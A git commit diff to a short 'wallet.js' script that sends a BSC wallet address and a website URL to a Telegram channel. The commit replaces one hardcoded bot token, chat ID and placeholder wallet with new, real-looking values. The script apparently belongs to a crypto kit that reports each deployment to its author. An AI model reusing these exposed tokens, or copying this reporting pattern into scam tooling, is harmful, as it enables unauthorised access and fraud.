3eb7acf57067ef58a3179547485bb6bf4208cf2d
wetinsupnah <155202115+wetinsupnah@users.noreply.github.com>
2024-07-13 13:22:24 -0700

    Update wallet.js

--- wallet.js
+++ wallet.js
@@ -1,10 +1,10 @@
 const axios = require('axios');
 
 // Telegram Bot API token
-const botToken = '6345787783:AAGQn2Uy7rpVfy76SOSJGA3jtt6fW2sH9U8';
+const botToken = '7368134923:AAHMwTgYMZGzYLqVxY_5TemmNibKPjSfzqU';
 
 // Telegram channel ID 
-const chatId = '4177494374';
+const chatId = '6556448976';
 
 
 async function sendMessageToTelegram(bsc_wallet_receiver_id, website_url) {
@@ -24,6 +24,6 @@ async function sendMessageToTelegram(bsc_wallet_receiver_id, website_url) {
 }
 
 // Change this information for yours (
-const bsc_wallet_receiver_id = 'YOURWALLET';
+const bsc_wallet_receiver_id = '0x66a4C667A4288D3DDb2591C861f567f3C43C8843';
 const website_url = 'YOUR_WEBSITE_URL';
 sendMessageToTelegram(bsc_wallet_receiver_id, website_url);
